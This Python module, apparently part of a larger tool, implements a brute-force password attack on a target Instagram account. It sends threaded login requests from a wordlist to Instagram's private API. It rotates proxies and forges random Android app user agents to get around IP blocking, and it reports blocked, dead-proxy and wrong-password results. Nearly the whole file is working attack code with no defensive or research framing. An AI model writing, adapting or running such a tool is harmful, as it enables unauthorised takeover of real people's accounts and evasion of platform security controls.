from concurrent.futures import (ThreadPoolExecutor, as_completed)
from .exceptions import (BlockedIP, DeadProxy,WrongPassword)
from .proxychecker import ProxyChecker
from .console import Console
from time import sleep
import uuid
import random
import requests
import random
import sys
import os


class Bruter:
    def __init__(self,wordlist:str,proxy_type:str,victim:str) -> None:
        self.__wordlist = wordlist
        self.__proxy_type = proxy_type
        self.__getproxy = []
        self.__victim = victim
        self.__readerwordlist
        __prxs = ["http","socks4","socks5"]
        os.system("cls")
        if self.__proxy_type in __prxs:
                print(f"[{self.__proxy_type}]\tProxy Checked is Starting")
                self.__getproxy = ProxyChecker(self.__proxy_type).getWorkerProxy
                os.system("cls")
        elif not self.__proxy_type in __prxs:
            try:
                with open(self.__proxy_type,"r") as prx_file:
                    self.__getproxy = prx_file.readlines()
                    for i in range(len(self.__getproxy)):
                        self.__getproxy[i] = self.__getproxy[i].removesuffix('\n')
            except FileNotFoundError:
                    print(f"{Console.RED}Please Specify the Path of the Proxy File{Console.DEFAULT}")
        if self.__getproxy == []:
            print("No Working Proxy Found!")
        else:
            print(f"{Console.RED}target>{self.__victim}{Console.BANNER_BRUTE}")
            self.__threadPool()

    @property
    def __readerwordlist(self):
        try:
            with open(file=self.__wordlist,mode="r",encoding="utf-8") as f:
                for i in f:
                    yield i.replace("\n","")
        except FileNotFoundError:
            print("File Not Found!")
    
    @property
    def __useragents(self):
        dpi_phone = ['133','320','515','160','640','240','120''800','480','225','768','216','1024']
        model_phone = ['Nokia 2.4','HUAWEI','Galaxy','Unlocked Smartphones','Nexus 6P','Mobile Phones','Xiaomi','samsung','OnePlus']
        pxl_phone = ['623x1280','700x1245','800x1280','1080x2340','1320x2400','1242x2688']
        i_version = ['114.0.0.20.2','114.0.0.38.120','114.0.0.20.70','114.0.0.28.120','114.0.0.0.24','114.0.0.0.41']
        user_agent = f'Instagram {random.choice(i_version)} Android (30/3.0; {random.choice(dpi_phone)}dpi; {random.choice(pxl_phone)}; huawei/google; {random.choice(model_phone)}; angler; angler; en_US)'
        return user_agent
    
    def __login(self,passw,timeout):
        choice_proxy = random.choice(self.__getproxy)
        __header = {
            'Host':'i.instagram.com','Accept':'*/*',  'User-Agent': self.__useragents,
            'Cookie':'missing','Accept-Encoding':'gzip, deflate',
            'Accept-Language':'en-US','X-IG-Capabilities':'3brTvw==',
            'X-IG-Connection-Type':'WIFI','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            }
        __data = {
                "uuid": uuid.uuid4(),"password": passw,
                "username": self.__victim,'device_id':uuid.uuid4(),
                'from_reg':'false','_csrftoken':'missing',
                'login_attempt_countn':'0'
            }
        __proxies = {
            "http":f"{self.__proxy_type}://{choice_proxy}",
            "https":f"{self.__proxy_type}://{choice_proxy}"
            }
        with requests.Session() as session:
            try:
                s = session.post("https://i.instagram.com/api/v1/accounts/login/",
                                    allow_redirects=True,data=__data,headers=__header,
                                    proxies=__proxies,timeout=timeout).json()
                print(f"{Console.GREEN}{s}{Console.DEFAULT}")
                if s["error_type"] == "ip_block":
                    raise BlockedIP(f"{Console.DARKCYAN}Blocked IP: {choice_proxy}{Console.DEFAULT}")
            
                if s["error_type"] == "bad_password":
                    raise WrongPassword(f"{Console.ORANGE}Wrong Password: {passw}{Console.DEFAULT}")
            except requests.exceptions.ProxyError:
                raise DeadProxy(f"{Console.RED}{choice_proxy:<20} > Proxy is Dead{Console.DEFAULT}")
    def __threadPool(self):
        with ThreadPoolExecutor(max_workers=None) as executor:
            future_to_password = {executor.submit(self.__login,passw,30): passw for passw in self.__readerwordlist}
            for future in as_completed(future_to_password):
                value = future_to_password[future]
                try:
                    future.result()
                except BlockedIP as e:
                    print(e)
                except WrongPassword as e:
                    print(e,value)
                except DeadProxy as e:
                    print(e)
        
                